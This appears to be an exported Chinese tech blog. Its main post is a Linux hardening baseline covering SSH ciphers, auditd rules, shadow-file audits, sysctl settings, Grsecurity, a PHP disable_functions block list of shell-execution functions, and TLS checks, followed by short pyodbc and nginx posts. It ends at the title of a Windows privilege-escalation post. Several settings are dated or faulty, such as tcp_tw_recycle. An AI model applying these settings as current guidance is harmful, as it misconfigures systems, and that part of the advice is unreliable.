SSH安全配置123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190openssh目前的默认配置文件相比以前虽然要安全的多，但还是有必要对生产系统中的ssh服务器进行基线检查。配置文件：/etc/ssh/ssh_config--------------------------------------------------------------1，known_hosts保存相关服务器的签名，所以必须把主机名hash:HashKnownHosts yes2，SSH协议v1不安全：Protocol 23，如果没用X11转发的情况：X11Forwarding no4，关闭rhosts:IgnoreRhosts yes5，关闭允许空密码登录：PermitEmptyPasswords no6，最多登录尝试次数：MaxAuthTries 57，禁止root登录PermitRootLogin no--------------------------------------------------------------(可选)--------------------------------------------------------------1，关闭密码认证，启用公钥认证：PubkeyAuthentication yesPasswordAuthentication no2，允许或者禁止用户/组登录:AllowGroups, AllowUsers, DenyUsers, DenyGroups--------------------------------------------------------------密钥交换( Kex)--------------------------------------------------------------OpenSSH支持8种密钥交换协议：1. curve25519-sha256: ECDH over Curve25519 with SHA22. diffie-hellman-group1-sha1: 1024 bit DH with SHA13. diffie-hellman-group14-sha1: 2048 bit DH with SHA14. diffie-hellman-group-exchange-sha1: Custom DH with SHA15. diffie-hellman-group-exchange-sha256: Custom DH with SHA26. ecdh-sha2-nistp256: ECDH over NIST P-256 with SHA27. ecdh-sha2-nistp384: ECDH over NIST P-384 with SHA28. ecdh-sha2-nistp521: ECDH over NIST P-521 with SHA2按照以下3个标准：* ECDH曲线：安标NIST已经受到污染所以排除6--8* DH的位数：排除1024-bit的* 安全的Hash：排除2--4的SHA1*** 只剩下1和5，建议配置：/etc/ssh/sshd_config:KexAlgorithms curve25519-sha256@libssh.org,diffie-hellman-group-exchange-sha256/etc/ssh/ssh_config snippet:Host * KexAlgorithms curve25519-sha256@libssh.org,diffie-hellman-group-exchange-sha256*** 建议删除/etc/ssh/moduli低于2048位长度的，或者直接创建：ssh-keygen -G /tmp/moduli -b 4096ssh-keygen -T /etc/ssh/moduli -f /tmp/moduli--------------------------------------------------------------认证( Authentication)--------------------------------------------------------------1. DSA2. ECDSA3. Ed255194. RSA2是属于被污染的NIST里的，这里不能通过配置来屏蔽ECDSA，但可以通过坏链接来实现：cd /etc/sshrm ssh_host_ecdsa_key*rm ssh_host_key*ln -s ssh_host_ecdsa_key ssh_host_ecdsa_keyln -s ssh_host_key ssh_host_keyDSA虽然没有被污染，但是必须要求是1024-bit，长度过低，所以关掉最好的情况是只使用：Protocol 2HostKey /etc/ssh/ssh_host_ed25519_key如果需要使用RSA，生成更高强度的密钥：cd /etc/sshrm ssh_host_rsa_key*ssh-keygen -t rsa -b 4096 -f ssh_host_rsa_key &lt; /dev/null生成客户端的密钥：ssh-keygen -t ed25519ssh-keygen -t rsa -b 4096--------------------------------------------------------------对称算法( Symmetric ciphers)--------------------------------------------------------------1. 3des-cbc2. aes128-cbc3. aes192-cbc4. aes256-cbc5. aes128-ctr6. aes192-ctr7. aes256-ctr8. aes128-gcm9. aes256-gcm10. arcfour11. arcfour12812. arcfour25613. blowfish-cbc14. ast128-cbc15. chacha20-poly1305对称算法选型是最后意思的，根据以下标准：* 算法本身的安全性，RC4和DES已经存在风险，所以排除1和10--12* 密钥强度：至少128-bit* 块大小：块加密的情况下至少128 bits* cipher mode：建议使用AE：https://en.wikipedia.org/wiki/Authenticated_encryption这样只剩下了5--9和15，/etc/ssh/sshd_config建议配置：Ciphers aes256-gcm@openssh.com,aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr建议配置/etc/ssh/ssh_config：Host * Ciphers aes256-gcm@openssh.com,aes128-gcm@openssh.com,chacha20-poly1305@openssh.com,aes256-ctr,aes192-ctr,aes128-ctr--------------------------------------------------------------MAC（Message authentication codes)：--------------------------------------------------------------为了抗侧信道攻击，所以必须采用先加密再MAC，OpenSSH提供了以下MAC支持：1. hmac-md52. hmac-md5-963. hmac-ripemd1604. hmac-sha15. hmac-sha1-966. hmac-sha2-2567. hmac-sha2-5128. umac-649. umac-12810. hmac-md5-etm11. hmac-md5-96-etm12. hmac-ripemd160-etm13. hmac-sha1-etm14. hmac-sha1-96-etm15. hmac-sha2-256-etm16. hmac-sha2-512-etm17. umac-64-etm18. umac-128-etm按照以下标准：* HASH算法的安全性，MD5和SHA1被排除* 必须先加密再MAC，所有不带-etm的被排除* Tag大小：最少256 bits，UMAC和RIPEMD160被排除* 密钥长度：至少128-bit建议配置/etc/ssh/sshd_config:MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com建议配置/etc/ssh/ssh_configHost * MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com为了兼容github，可以加上：Host github.com MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com,hmac-sha2-512 1.4 auditd审计框架1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071auditd是接收内核审计模块关于系统调用信息的一个用户态程序，可以通过一些规则来对一些系统调用或者文件目录进行监控。安装auditd:sudo apt-get install auditd配置文件:/etc/audit/auditd.conf存储地址log_file = /var/log/audit/audit.log审计规则的配置文件：/etc/audit/audit.rules，这里给出一个例子：--------------------------------------------------------------# First rule - delete all-D# Increase the buffers to survive stress events.# Make this bigger for busy systems-b 320-a always,exit -S adjtimex -S settimeofday -S stime -k time-change-a always,exit -S clock_settime -k time-change-a always,exit -S sethostname -S setdomainname -k system-locale# Monitor binaries ps &amp; ls and saved the log when being executed....-a always,exit -F path=/bin/ps -F path=/bin/ls -F perm=x -k binaries-w /etc/group -p wa -k identity-w /etc/passwd -p wa -k identity-w /etc/shadow -p wa -k identity-w /etc/sudoers -p wa -k identity-w /var/run/utmp -p wa -k session-w /var/log/wtmp -p wa -k session-w /var/log/btmp -p wa -k session-w /etc/apparmor -p wa -k MAC-policy-w /etc/apparmor.d -p wa -k MAC-policy--------------------------------------------------------------上面的例子对一系列关于时间的系统调用进行了监控，一旦时间出现改变就会记录进如日志，之后对几个跟创建/删除用户和组的文件也进行了监控，最后是对apparmor的配置文件和规则目录进行监控。在/etc/apparmor下的shell中输入：sudo touch hello用工具ausearch来进行查询：--------------------------------------------------------------sudo ausearch -i -k MAC-policy----type=CONFIG_CHANGE msg=audit(07/20/2014 20:36:48.397:58) : auid=root ses=2 op=&quot;add rule&quot; key=MAC-policy list=exit res=1----type=CONFIG_CHANGE msg=audit(07/20/2014 20:36:48.445:59) : auid=root ses=2 op=&quot;add rule&quot; key=MAC-policy list=exit res=1----type=PATH msg=audit(07/20/2014 20:38:42.717:61) : item=1 name=hello inode=799889 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 nametype=CREATEtype=PATH msg=audit(07/20/2014 20:38:42.717:61) : item=0 name=/etc/apparmor inode=783766 dev=08:01 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=PARENTtype=CWD msg=audit(07/20/2014 20:38:42.717:61) : cwd=/etc/apparmortype=SYSCALL msg=audit(07/20/2014 20:38:42.717:61) : arch=i386 syscall=open success=yes exit=3 a0=bfeca8ab a1=8941 a2=1b6 a3=1 items=2 ppid=17704 pid=17876 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=2 comm=touch exe=/bin/touch key=MAC-policy----type=PATH msg=audit(07/20/2014 20:38:56.017:62) : item=1 name=hello inode=799889 dev=08:01 mode=file,644 ouid=root ogid=root rdev=00:00 nametype=DELETEtype=PATH msg=audit(07/20/2014 20:38:56.017:62) : item=0 name=/etc/apparmor inode=783766 dev=08:01 mode=dir,755 ouid=root ogid=root rdev=00:00 nametype=PARENTtype=CWD msg=audit(07/20/2014 20:38:56.017:62) : cwd=/etc/apparmortype=SYSCALL msg=audit(07/20/2014 20:38:56.017:62) : arch=i386 syscall=unlinkat success=yes exit=0 a0=ffffff9c a1=89eb8c0 a2=0 a3=0 items=2 ppid=17704 pid=17889 auid=root uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=pts1 ses=2 comm=rm exe=/bin/rm key=MAC-policy--------------------------------------------------------------也可以使用aureport来生成报告。记录tty的场景:编辑/etc/pam.d/password-auth-ac：session required pam_tty_audit.so enable=*查看相关信息：#tail -n 20 /var/log/audit/audit.log#aureport --tty -ts today 1.4.1 针对文件的审计1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677781, Leo Juranic的详细的分析[]了异常的通配符威胁有多大，：--------------------------------------------------------------find / -path /proc -prune -name &quot;-*&quot;--------------------------------------------------------------2, 所谓的world-writable权限的文件是不太合理的，所以这种文件我们必须得提防：--------------------------------------------------------------find / -path /proc -prune -o -perm -2 ! -type l -ls针对日志的world-readable也需要注意：find /var/log -perm -o=r ! -type l正确：chmod 640 /var/log/--------------------------------------------------------------3, 一个没有owner的文件是存在潜在威胁的，因为你永远也不知道未来某个时候她的uid/gid成为了你的敌人：--------------------------------------------------------------find / -path /proc -prune -o -nouser -o -nogroup--------------------------------------------------------------4, 作为&quot;自主可控&quot;的自由软件用户，你得知道你的生产环境中哪些用户是可用的：--------------------------------------------------------------egrep -v &apos;.*:\\*|:\\!&apos; /etc/shadow | awk -F: &apos;&#123;print $1&#125;&apos;--------------------------------------------------------------5, 你要删除一个用户前，应该先了解一些有哪些文件是他拥有的：--------------------------------------------------------------xfind / -path /proc -prune -o -user account -ls然后，安全的删除：userdel -r account--------------------------------------------------------------6, 如果不带&apos;:x:&apos;的用户肯定是无法正常使用的：--------------------------------------------------------------grep -v &apos;:x:&apos; /etc/passwd--------------------------------------------------------------7, 找到没有密码的用户：--------------------------------------------------------------cat /etc/shadow | cut -d: -f 1,2 | grep &apos;!&apos;--------------------------------------------------------------8，找到被锁定的用户：--------------------------------------------------------------cat /etc/shadow | cut -d: -f 1,2 | grep &apos;*&apos;--------------------------------------------------------------9, 找到带有过期密码的用户：--------------------------------------------------------------cat /etc/shadow | cut -d: -f 1,2 | grep &apos;!!&apos;passwd -u -l可以操作--------------------------------------------------------------10, /boot目录权限下至少是644，甚至是600:--------------------------------------------------------------ls -l /boot--------------------------------------------------------------11，找到suid和sgid相关的可执行文件：--------------------------------------------------------------find / -xdev -user root \\( -perm -4000 -o -perm -2000 \\)--------------------------------------------------------------(可选)1, GNU/Linux的访问控制列表(ACL)也是不错的文件权限管理的途径，获得文件ACL的信息：--------------------------------------------------------------getfacl file设置哪些用户对哪些文件有什么样的权限：setfacl -m u:user:r file-------------------------------------------------------------- 1.4.2 Prevent UNSET bash history123456789针对history_bash不允许unset:#Prevent unset of histfile, /etc/profileexport HISTSIZE=1500readonly HISTFILEreadonly HISTFILESIZEreadonly HISTSIZE#Set .bash_history as attr +afind / -maxdepth 3|grep -i bash_history|while read line; do chattr +a &quot;$line&quot;; done 1.5 sudoers123456789101112131415161718192021222324252627282930313233343536373839执行visudo，让普通用户shawn有所有权限：shawn ALL=(ALL) ALL让普通用户shawn只能以root权限执行ls和cat：shawn ALL=/bin/ls,/bin/cat让普通用户shawn只能在主机localhost上以root权限执行ls：shawn localhost=/bin/ls--[ 2. 内核安全基线SYN cookies防护主要是为了防止SYN洪水攻击，开启设置为1：--------------------------------------------------------------net.ipv4.tcp_syncookies = 1/proc/sys/net/ipv4/tcp_syncookies(可选)，如果需要开启SYNPROXY可以直接：iptables -t raw -A PREROUTING -i eth0 -p tcp --dport 80 --syn -j NOTRACKiptables -A INPUT -i eth0 -p tcp --dport 80 -m state UNTRACKED,INVALID \\ -j SYNPROXY --sack-perm --timestamp --mss 1480 --wscale 7 --ecnecho 0 &gt; /proc/sys/net/netfilter/nf_conntrack_tcp_loose注意:SYNPROXY是在Linux内核3.13里加入的NETFILTER特性。--------------------------------------------------------------TCP FIN-WAIT-2状态保留时间，目前很多发行版的默认时间是60秒，这个值太大会造成DOS攻击的风险，太小也有一定概率造成远端机器来不急主动关掉链接，建议一般设置成15：--------------------------------------------------------------参考：http://benohead.com/tcp-about-fin_wait_2-time_wait-and-close_wait/net.ipv4.tcp_fin_timeout = 15/proc/sys/net/ipv4/tcp_fin_timeout-------------------------------------------------------------- 网络抗DOS相关：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768SYN队列的长度，值越大能处理更多的链接数：net.ipv4.tcp_max_syn_backlog = 8192/proc/sys/net/ipv4/tcp_max_syn_backlog设备队列的长度，这个值建议比syn队列大：net.core.netdev_max_backlog = 16384/proc/sys/net/core/netdev_max_backloglisten()的backlog限制数，内存大可以提升到65535：net.core.somaxconn = 4096/proc/sys/net/core/somaxconnTIME_WAIT状态的TCP链接最大数，超过这个值系统会自动清除，抗DOS攻击的选项：net.ipv4.tcp_max_tw_buckets = 4096/proc/sys/net/ipv4/tcp_max_tw_bucketsTIME-WAIT状态的链接重新使用于新的TCP链接，1表示允许：net.ipv4.tcp_tw_reuse = 1/proc/sys/net/ipv4/tcp_tw_reuseTIME-WAIT状态的链接快速回收，1表示开启：net.ipv4.tcp_tw_recycle = 1/proc/sys/net/ipv4/tcp_tw_recycleTCP KEEPALIVE探测频率，以秒为单位，建议设置在30分钟以内，300为5分钟：net.ipv4.tcp_keepalive_time = 300/proc/sys/net/ipv4/tcp_keepalive_timeTCP KEEPALIVE探测包的数量：net.ipv4.tcp_keepalive_probes = 3/proc/sys/net/ipv4/tcp_keepalive_probesSYN和SYN+ACK的重传次数：net.ipv4.tcp_syn_retries = 3/proc/sys/net/ipv4/tcp_syn_retriesnet.ipv4.tcp_synack_retries = 3/proc/sys/net/ipv4/tcp_synack_retriesTCP ORPHAN的值调大能防止简单DOS攻击，每个ORPHAN消耗大约64k的内存，65535相当于4GB内存：net.ipv4.tcp_max_orphans = 65536/proc/sys/net/ipv4/tcp_max_orphansTCP链接的内存大小，以PAGE为单位，x86下每个page为4KB大小：net.ipv4.tcp_mem = 131072 196608 262144/proc/sys/net/ipv4/tcp_mem如果不是特殊场景的服务器或者网络设备，一般不要调整tcp_mem，超过最大的值会报OOM的错误。设置最大的发送和接收窗口,以10G NIC为例,设置64MB：net.core.rmem_max = 67108864/proc/sys/net/core/rmem_maxnet.core.wmem_max = 67108864/proc/sys/net/core/wmem_max每个TCP链接的读，写缓冲区内存大小，单位为Byte：net.ipv4.tcp_rmem = 4096 8192 16777216( 4096 87380 33554432)/proc/sys/net/ipv4/tcp_rmemnet.ipv4.tcp_wmem = 4096 8192 16777216( 4096 65536 33554432)/proc/sys/net/ipv4/tcp_wmem如果按照缺省分配8KB * 2 = 16KB/链接，4GB内存能提供的链接数为：(4 * 1024 * 1024) / 16 = 262144 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596Oracle 10g的最佳建议：http://www.dba-oracle.com/t_linux_networking_kernel_parameters.htm--------------------------------------------------------------源路由通常可以用于在IP包的OPTION里设置途经的部分或者全部路由器，这个特性可以用于网络排错和优化，比如traceroute，攻击者也可以使用这个特性来进行IP欺骗，关闭设置为0：--------------------------------------------------------------net.ipv4.conf.all.accept_source_route = 0/proc/sys/net/ipv4/conf/all/accept_source_route--------------------------------------------------------------ICMP重定向，正常用于选择最优路径，攻击者可以利用开展中间人攻击，关闭设置为0:--------------------------------------------------------------net.ipv4.conf.all.accept_redirects = 0/proc/sys/net/ipv4/conf/all/accept_redirects--------------------------------------------------------------如果这台GNU/Linux是作为服务器使用而非网关设备，可以关掉：--------------------------------------------------------------net.ipv4.conf.all.send_redirects = 0net.ipv4.conf.default.send_redirects = 0--------------------------------------------------------------IP欺骗防护，启动设置为1：--------------------------------------------------------------net.ipv4.conf.all.rp_filter = 1/proc/sys/net/ipv4/conf/all/rp_filter--------------------------------------------------------------忽略ICMP请求( PING)，启动设置为1：--------------------------------------------------------------net.ipv4.icmp_echo_ignore_all = 1/proc/sys/net/ipv4/icmp_echo_ignore_all--------------------------------------------------------------忽略ICMP广播请求，启动设置为1：--------------------------------------------------------------net.ipv4.icmp_echo_ignore_broadcasts = 1/proc/sys/net/ipv4/icmp_echo_ignore_broadcasts--------------------------------------------------------------错误消息防护，会警告你关于网络中的ICMP异常，启动设置为1：--------------------------------------------------------------net.ipv4.icmp_ignore_bogus_error_responses = 1/proc/sys/net/ipv4/icmp_ignore_bogus_error_responses--------------------------------------------------------------对特定packet(IP欺骗，源路由，重定向）进行审计，启动设置为1：--------------------------------------------------------------/proc/sys/net/ipv4/conf/all/log_martiansnet.ipv4.conf.all.log_martians = 1--------------------------------------------------------------地址随机化，启动设置为2：--------------------------------------------------------------kernel.randomize_va_space=2/proc/sys/kernel/randomize_va_space--------------------------------------------------------------内核符号限制访问，启动设置为1：--------------------------------------------------------------kernel.kptr_restrict=1/proc/sys/kernel/kptr_restrict类似CVE-2014-0196的exploit对于这一项就很难做到“通杀”;-)--------------------------------------------------------------内存映射最小地址，启动设置为65536：--------------------------------------------------------------vm.mmap_min_addr=65536/proc/sys/vm/mmap_min_addr--------------------------------------------------------------防护进程被ptrace跟踪调试:--------------------------------------------------------------kernel.yama.ptrace_scope = 2/proc/sys/kernel/yama/ptrace_scope0: 所有进程都可以被调试1: 只有一个父进程可以被调试2: 只有系统管理员可以调试（CAP_SYS_PTRACE ）3: 没有进程允许被调试一般加固机用3，普通服务器用2/1。 Apparmor123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566安装Apparmor和社区规则：sudo apt-get install -y apparmor-profiles apparmor查看状态是否运行正常：sudo aa-status----------------------------------------------------------------[ 3. 加固安全基线是在防御已知的威胁，而加固则是侧重于防御未知的威胁，加固的主要目的是增加攻击者的成本。----[ 3.1 内核加固 - Grsecurity/PaXGNU/Linux平台从用户空间到内核空间都有一系列的加固措施，但是,对于真正面临复杂安全环境,确实需要高级安全防护能力的机构,最极端的加固防御是:Grsecurity/PaX，对于注重完美的“老派( old school )”黑客社区而言,没有Grsecurity/PaX 的定制方案是不完美的 ,这里摘选几段old school社区的调侃：&quot;The &quot;better than none&quot; point of view is actually a nice way to falsesense of security for those who don&apos;t know better. We gotbetter-than-none apparmor, selinux, tomoyo, some poorly maintained andcrippled ports of grsec features or alikes, namespaces and containers,rootkit-friendly LSM, the dumb and useless kernel version of SSP,etc. What&apos;s the sum of all this shit for end users? False sense ofsecurity...&quot;&quot;without Grsecurity/PaX, linux security is like monkey can neverperform a regular masturbation cu&apos;z lacking of giant pennis;-)&quot;作为个人完全赞同以上观点，太多的better-than-none可以算是&quot;甜点&quot;，用户使用后会觉得自high的很爽，但是到了夜幕降临的时候，用户还是很难入睡，因为&quot;痛点&quot;依然在那里，在安全领域，&quot;甜点&quot;就是&quot;安全感&quot;，安全感绝对不等同于安全。Anyway，对于商业客户而言，是否对Grsecurity/PaX定制是一种选择。安装新的带Grsecurity/PaX补丁的内核，以3.14.1为例，先下载原生内核：--------------------------------------------------------------https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.14.1.tar.xz下载Grsecurity/PaX补丁：https://github.com/citypw/citypw-SCFE/raw/master/security/apparmor_test/grsecurity-3.0-3.14.11-201407072045.patch解压内核然后打补丁：Patch the kernel with grsecurity:xz -d linux-3.14.1.tar.xztar xvf linux-3.14.1.tarcd linux-3.14.1/patch -p1 &lt; ../grsecurity-3.0-3.14.3-201405121814.patch你可以在&quot;make menuconfig&quot;里自己定制符合你口味的内核，也可以使用我测试用的内核config文件：https://raw.githubusercontent.com/citypw/citypw-SCFE/master/security/apparmor_test/debian-7.4-linux-3.14.1-grsec.config编译内核(-jx, x通常==你的CPU核数+1):make -j7 deb-pkg安装编译后的内核:dpkg -i ../*.deb--------------------------------------------------------------现在内核的部分结束，关于RBAC规则可以使用用户态工具gradm的Learning Mode来实现，但不在本文的讨论范畴。 3.2 PHP加固1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798991001011021031041051061071081091101111121131141151161171181191201211221231241251261271281291301311321331341351361371381391401411421431441451461471481491501511521531541551561571581591601611621631641651661671681691701711721731741751761771781791801811821831, PHP是常用的WEB开发语言，在WEB生产环境部署的过程中，目录和文件的权限是需要关注的，通常除了少数用途的目录（比如上传）外，都应该把写入权限禁用：--------------------------------------------------------------find -type f -name \\*.php -exec chmod 444 &#123;&#125; \\;find -type d -exec chmod 555 &#123;&#125; \\;--------------------------------------------------------------2, 开启 php 的安全模式,禁用 php 不安全的函数等加固，修改 php 配置文件/etc/php5/apache2/php.ini :--------------------------------------------------------------// 设置模式为安全模式,此值直接影响 disable_functions 的命令是否生效;[SQL]; http://php.net/sql.safe-modesql.safe_mode = On// 禁用不安全的函数disable_functions = system, show_source, symlink, exec, dl, shell_exec,passthru, phpinfo, escapeshellarg, escapeshellcmd// 避免暴露 php 信息expose_php = Off// 关闭错误信息提示display_errors = Off// 不允许调用 dlenable_dl = Off// 避免远程调用文件allow_url_include = Off----------------------------------------------------------------[ 4. SSL/TLS基线检查SSL/TLS的实现经历BEAST/CRIME/LUCKY-13/HEARTBLEED/POODLE一系列的安全事件后，我们根据之前的NDAY漏洞的经验可以制定一些安全基线。这里给出的例子都以HOST为&quot;www.google.com&quot;和PORT为443。SSLv2早已经因为一系列安全漏洞被废弃，必须保证在生产环境当中去除，用以下命令验证：--------------------------------------------------------------openssl s_client -ssl2 -connect www.google.com:443由于OpenSSL 1.0开始已经不支持SSLv2，所以这条命令如果成功执行代表你有危险，GnuTLS也可以用类似的命令来快速检测：gnutls-cli -d 5 -p 443 --priority &quot;NORMAL:-VERS-TLS1.2:-VERS-TLS1.1:-VERS-TLS1.0:-VERS-SSL3.0&quot; www.google.com--------------------------------------------------------------SSLv3的漏洞也不少，POODLE攻击是其中的著名例子，如果你没有运行非常古老的软件(比如IE6)，那你应该禁用掉SSLv3，检测对端是否支持SSLv3：--------------------------------------------------------------gnutls-cli -d 5 -p 443 --priority &quot;NORMAL:-VERS-TLS1.2:-VERS-TLS1.1:-VERS-TLS1.0&quot; www.google.com | grep -i version如果能看到&quot;- Version: SSL3.0&quot;那你得当心了。--------------------------------------------------------------目前(2014年11月18日)，只有TLS 1.1/1.2是相对安全的，EFF早在2011年就建议公众使用TLS 1.2的PFS，检查是否支持TLS 1.1/1.2：--------------------------------------------------------------gnutls-cli -p 443 --priority &quot;NORMAL:-VERS-TLS1.2:-VERS-TLS1.0:-VERS-SSL3.0&quot; www.google.com | grep -i version显示“- Version: TLS1.1&quot;就说明支持TLS 1.1。gnutls-cli -p 443 --priority &quot;NORMAL:-VERS-TLS1.1:-VERS-TLS1.0:-VERS-SSL3.0&quot; www.google.com | grep -i version显示”- Version: TLS1.2“就说明支持TLS 1.2。使用OpenSSL工具也可以检测：openssl s_client -tls1_1 -connect www.google.com:443 | grep -i protocolopenssl s_client -tls1_2 -connect www.google.com:443 | grep -i protocol--------------------------------------------------------------安全重协商支持：--------------------------------------------------------------gnutls-cli -d 5 -p 443 www.google.com显示“Safe renegotiation succeeded“说明支持--------------------------------------------------------------客户端发起的重协商：--------------------------------------------------------------详情见：http://www.solidot.org/story?sid=34026--------------------------------------------------------------公钥长度检测：--------------------------------------------------------------gnutls-cli -p 443 www.google.com | grep -i key如果公钥小于或者等于1024-bit，请根据业务场景重新评估安全性。--------------------------------------------------------------检测是否存在较弱的ciphersuites：--------------------------------------------------------------openssl s_client -cipher NULL,EXPORT,LOW,DES -connect www.google.com:443如果执行成功代表有风险。--------------------------------------------------------------PFS( Perfect Forward Secrecy)，对性能有至少10%左右的损耗。--------------------------------------------------------------openssl s_client -cipher EDH,EECDH -connect www.google.com:443如果成功说明支持PFS，这个特性是EFF强烈推荐的。--------------------------------------------------------------CRIME攻击是利用压缩算法，所以可以检测：--------------------------------------------------------------gnutls-cli www.google.com -p 443 | grep -i compress如果显示“- Compression: NULL“就是安全的。--------------------------------------------------------------OpenSSL的Heartbeat特性：--------------------------------------------------------------openssl s_client -tlsextdebug -connect www.google.com:443 | grep -i heart显示&quot;TLS server extension heartbeat&quot;说明此特性开启。--------------------------------------------------------------POODLE:--------------------------------------------------------------openssl s_client -ssl3 -fallback_scsv -connect www.google.com:443 | grep -i &quot;alert ina&quot;显示&quot;alert inappropriate fallback&quot;则是安全的。--------------------------------------------------------------FREAK:--------------------------------------------------------------openssl s_client -cipher EXPORT -connect www.google.com:443如果协商成功则说明有风险。----------------------------------------------------------------[ 5. Weirdo auditGrinch攻击虽然不是漏洞，但pkcon+wheel的组合场景还是需要注意，首先检查wheel组是否存在：grep -i wheel /etc/group如果存在的话检查pkcon是否存在。--[ 6. Reference[1] 开源闭源项目代码质量对比 http://www.solidot.org/story?sid=39173[2] Back To The Future: Unix Wildcards Gone Wild http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt[3] SYNPROXY：廉价的抗DoS攻击方案 www.solidot.org/story?sid=38791[4] INTERNET PROTOCOL http://tools.ietf.org/html/rfc791[5] A simple TCP spoofing attack http://www.citi.umich.edu/u/provos/papers/secnet-spoof.txt[6] ICMP Attacks Illustrated http://www.sans.org/reading-room/whitepapers/threats/icmp-attacks-illustrated-477[7] SUSE Linux Enterprise Server 11 SP3 - Security and Hardening https://www.suse.com/documentation/sles11/singlehtml/book_hardening/book_hardening.html[8] Securing Debian Manual https://www.debian.org/doc/manuals/securing-debian-howto/[9] A Brief Introduction to auditd http://security.blogoverflow.com/2013/01/a-brief-introduction-to-auditd/[10] Apparmor RBAC http://wiki.apparmor.net/index.php/Pam_apparmor_example[11] Hardening PHP from php.ini http://www.madirish.net/199[12] CVE-2014-0196 exploithttp://bugfuzz.com/stuff/cve-2014-0196-md.c[13] Secure Secure Shellhttps://stribika.github.io/2015/01/04/secure-secure-shell.html","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"Python pyodbc 连接SQL Server","date":"2017-01-22T14:28:41.000Z","path":"devops/Python-pyodbc-连接SQL-Server/","text":"前言 最近在处理数据，有一批数据是在MSSQL中的，打算导出整理后扔到MongoDB中网上找了下 Python有个叫pyodbc的库，自己本地在Mac上跑起来没啥问题，不过将脚本迁移到Server上run的时候遇到了些问题，所以记录下 Run On Mac 直接安装微软官方的安装教程，就能跑起来 123456ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"brew tap microsoft/msodbcsql https://github.com/Microsoft/homebrew-msodbcsqlbrew updatebrew install msodbcsql#for silent install ACCEPT_EULA=y brew install msodbcsqlsudo pip install pyodbc==3.1.1 Run On CentOS Server 服务器用的是CentOS需要先安装gcc和python-devel 1yum install python-devel gcc -y 然后再安装微软的这个教程来,就能跑起来了，我的是CentOS 7,所以安装步骤为 12345sudo sucurl https://packages.microsoft.com/config/rhel/7/prod.repo &gt; /etc/yum.repos.d/mssql-release.repoexitsudo yum remove unixODBC-utf16 unixODBC-utf16-devel #to avoid conflictssudo ACCEPT_EULA=Y yum install msodbcsql-13.1.4.0-1 mssql-tools-14.0.3.0-1 unixODBC-devel 而且我用的是zsh，所以后将相关环境变量放到zshrc就好了 123echo 'export PATH=\"$PATH:/opt/mssql-tools/bin\"' &gt;&gt; ~/.zshrcecho 'export PATH=\"$PATH:/opt/mssql-tools/bin\"' &gt;&gt; ~/.zshrcsource ~/.zshrc","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"},{"name":"Python","slug":"Python","permalink":"http://yoursite.com/tags/Python/"},{"name":"SQL Server","slug":"SQL-Server","permalink":"http://yoursite.com/tags/SQL-Server/"}]},{"title":"一些前端工具","date":"2016-12-20T11:38:11.000Z","path":"others/一些前端工具/","text":"实时刷新页面1Broswer-Sync css双向修改1LiveStyle 实时JS HTML修改预览1Livereload","tags":[{"name":"前端","slug":"前端","permalink":"http://yoursite.com/tags/前端/"}]},{"title":"Nginx 自签发SSL配置实例","date":"2016-11-25T11:31:50.000Z","path":"devops/Nginx-自签发SSL配置实例/","text":"env Debian Linux 安装Nginx1apt-get install nginx 创建自签发SSL证书 我是把证书相关信息放在/etc/nginx/ssl/文件夹中所以先创建该文件夹 1mkdir /etc/nginx/ssl 创建SSL证书gencert.sh该文件我也放在/etc/nginx/ssl目录下 1234567891011121314151617181920212223242526272829303132333435#!/bin/sh# create self-signed server certificate:read -p \"Enter your domain [www.example.com]: \" DOMAINecho \"Create server key...\"openssl genrsa -des3 -out $DOMAIN.key 1024echo \"Create server certificate signing request...\"SUBJECT=\"/C=US/ST=Mars/L=iTranswarp/O=iTranswarp/OU=iTranswarp/CN=$DOMAIN\"openssl req -new -subj $SUBJECT -key $DOMAIN.key -out $DOMAIN.csrecho \"Remove password...\"mv $DOMAIN.key $DOMAIN.origin.keyopenssl rsa -in $DOMAIN.origin.key -out $DOMAIN.keyecho \"Sign SSL certificate...\"openssl x509 -req -days 3650 -in $DOMAIN.csr -signkey $DOMAIN.key -out $DOMAIN.crtecho \"TODO:\"echo \"Copy $DOMAIN.crt to /etc/nginx/ssl/$DOMAIN.crt\"echo \"Copy $DOMAIN.key to /etc/nginx/ssl/$DOMAIN.key\"echo \"Add configuration in nginx:\"echo \"server &#123;\"echo \" ...\"echo \" listen 443 ssl;\"echo \" ssl_certificate /etc/nginx/ssl/$DOMAIN.crt;\"echo \" ssl_certificate_key /etc/nginx/ssl/$DOMAIN.key;\"echo \"&#125;\" 操作方法如下图说明 https://www.trustasia.com/help/nginx-generate-csr.htm 效果图","tags":[{"name":"Linux","slug":"Linux","permalink":"http://yoursite.com/tags/Linux/"}]},{"title":"Windows 提权方法总结","date":"2016-11-23T04:34:46.000Z","path":"sec/Windows-提权方法总结/","text":"文章来源 